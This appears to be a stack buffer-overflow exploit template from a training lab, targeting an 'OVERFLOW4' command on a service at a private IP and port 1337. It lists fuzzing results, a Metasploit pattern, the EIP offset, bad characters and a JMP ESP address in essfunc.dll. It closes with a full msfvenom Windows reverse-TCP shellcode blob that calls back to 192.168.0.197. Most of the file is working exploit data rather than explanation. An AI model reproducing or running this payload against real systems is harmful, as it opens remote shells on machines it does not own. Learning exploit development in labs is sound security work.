#In this file resides the BO Template
##########################################################################################
#Get the IP and port for the target machine.
targetIP='192.168.0.168'
port=1337
##########################################################################################
#Step 0 -- Spike the service to see which command is vulnerable. In these cases, we know all the functions are vulnerable.
##########################################################################################
command="OVERFLOW4 "

##########################################################################################
#Step 1 -- Fuzz the app, find approx bytes it takes to crash the program.
##########################################################################################

# ./1-fuzz.py
# Server Crashed at : 2200 Bytes.

##########################################################################################
# Step 2 -- With the approximate bytes, generate a pattern using the following command.
##########################################################################################

# -----------------------Generate Pattern -------------------------------------------------#
# While generating pattern, take 400 more bytes, just in case.
# /opt/metasploit-framework/embedded/framework/tools/exploit/pattern_create.rb -l 2600
buffer_pattern="Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2Cv3Cv4Cv5Cv6Cv7Cv8Cv9Cw0Cw1Cw2Cw3Cw4Cw5Cw6Cw7Cw8Cw9Cx0Cx1Cx2Cx3Cx4Cx5Cx6Cx7Cx8Cx9Cy0Cy1Cy2Cy3Cy4Cy5Cy6Cy7Cy8Cy9Cz0Cz1Cz2Cz3Cz4Cz5Cz6Cz7Cz8Cz9Da0Da1Da2Da3Da4Da5Da6Da7Da8Da9Db0Db1Db2Db3Db4Db5Db6Db7Db8Db9Dc0Dc1Dc2Dc3Dc4Dc5Dc6Dc7Dc8Dc9Dd0Dd1Dd2Dd3Dd4Dd5Dd6Dd7Dd8Dd9De0De1De2De3De4De5De6De7De8De9Df0Df1Df2Df3Df4Df5Df6Df7Df8Df9Dg0Dg1Dg2Dg3Dg4Dg5Dg6Dg7Dg8Dg9Dh0Dh1Dh2Dh3Dh4Dh5Dh6Dh7Dh8Dh9Di0Di1Di2Di3Di4Di5Di"
# Then send this pattern to the app, and then copy the bytes from EIP.
# ./2-offset.py
# Pattern found from the EIP : 70433570

###########################################################################################
#Step 3 ---> Get the exact offset from the Pattern and verify if we can control the EIP.
###########################################################################################
# Get the exact offset using the following command
# /opt/metasploit-framework/embedded/framework/tools/exploit/pattern_offset.rb -l 2600 -q 70433570
offset=2026
# Run ./3-controlEip.py to check if the EIP is now 42424242.
# If it is, move ahead, otherwise see if the offset is correct or maybe 42 is the bad char.
# Basically debug.

###########################################################################################
# This is the most important part.
# Step 4 - Find bad chars.
###########################################################################################
#This is the default set of all the hex numbers.
badchars=(
"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
"\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
)
# Run ./4-findBadChar.py
# Go to immunity debugger, and follow the Tcp Dump of ESP.
# Copy the contents from 01 to FF to hexDump inside the BadChars directory and run ./run.sh
# BadChars = \x00\xA9\xCD\xD4
###########################################################################################
# Step 5 - Choosing the correct module and checking if the call is made.
###########################################################################################

# use !mona modules to find a dll that has all protection as off.
# then use this dll to search for a memory address.
# !mona find -s "\xff\xe4" -m essfunc.dll, here choose the return address that DOESNOT HAVE ANY BADCHAR
jmpCode="625011AF"
# convert that to little endian
jmpCode="\xaf\x11\x50\x62"
# After this step, check if the EIP has been over written.
# To check, open the app in immuntiy, create a breakpoint on the address before conversion to littleEndian
# ./5-checkGenShell.py
# and then verify if the EIP is the same. Once we have that, it's time to generate shell code.

##############################################################################################
# Step 6 - Gaining the shell
##############################################################################################
padding="\x90"*32
# Generate this overflow variable using the following command:
# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.0.197 LPORT=1337 EXITFUNC=thread -f c -a x86 -b "\x00\xA9\xCD\xD4"
# 351 Bytes
overflow = (
"\xdd\xc4\xb8\x7b\x5e\x71\x09\xd9\x74\x24\xf4\x5b\x31\xc9\xb1"
"\x52\x31\x43\x17\x03\x43\x17\x83\xb8\x5a\x93\xfc\xc2\x8b\xd1"
"\xff\x3a\x4c\xb6\x76\xdf\x7d\xf6\xed\x94\x2e\xc6\x66\xf8\xc2"
"\xad\x2b\xe8\x51\xc3\xe3\x1f\xd1\x6e\xd2\x2e\xe2\xc3\x26\x31"
"\x60\x1e\x7b\x91\x59\xd1\x8e\xd0\x9e\x0c\x62\x80\x77\x5a\xd1"
"\x34\xf3\x16\xea\xbf\x4f\xb6\x6a\x5c\x07\xb9\x5b\xf3\x13\xe0"
"\x7b\xf2\xf0\x98\x35\xec\x15\xa4\x8c\x87\xee\x52\x0f\x41\x3f"
"\x9a\xbc\xac\x8f\x69\xbc\xe9\x28\x92\xcb\x03\x4b\x2f\xcc\xd0"
"\x31\xeb\x59\xc2\x92\x78\xf9\x2e\x22\xac\x9c\xa5\x28\x19\xea"
"\xe1\x2c\x9c\x3f\x9a\x49\x15\xbe\x4c\xd8\x6d\xe5\x48\x80\x36"
"\x84\xc9\x6c\x98\xb9\x09\xcf\x45\x1c\x42\xe2\x92\x2d\x09\x6b"
"\x56\x1c\xb1\x6b\xf0\x17\xc2\x59\x5f\x8c\x4c\xd2\x28\x0a\x8b"
"\x15\x03\xea\x03\xe8\xac\x0b\x0a\x2f\xf8\x5b\x24\x86\x81\x37"
"\xb4\x27\x54\x97\xe4\x87\x07\x58\x54\x68\xf8\x30\xbe\x67\x27"
"\x20\xc1\xad\x40\xcb\x38\x26\xaf\xa4\x42\x73\x47\xb7\x42\x7e"
"\xa1\x3e\xa4\xea\xc1\x16\x7f\x83\x78\x33\x0b\x32\x84\xe9\x76"
"\x74\x0e\x1e\x87\x3b\xe7\x6b\x9b\xac\x07\x26\xc1\x7b\x17\x9c"
"\x6d\xe7\x8a\x7b\x6d\x6e\xb7\xd3\x3a\x27\x09\x2a\xae\xd5\x30"
"\x84\xcc\x27\xa4\xef\x54\xfc\x15\xf1\x55\x71\x21\xd5\x45\x4f"
"\xaa\x51\x31\x1f\xfd\x0f\xef\xd9\x57\xfe\x59\xb0\x04\xa8\x0d"
"\x45\x67\x6b\x4b\x4a\xa2\x1d\xb3\xfb\x1b\x58\xcc\x34\xcc\x6c"
"\xb5\x28\x6c\x92\x6c\xe9\x8c\x71\xa4\x04\x25\x2c\x2d\xa5\x28"
"\xcf\x98\xea\x54\x4c\x28\x93\xa2\x4c\x59\x96\xef\xca\xb2\xea"
"\x60\xbf\xb4\x59\x80\xea"
)
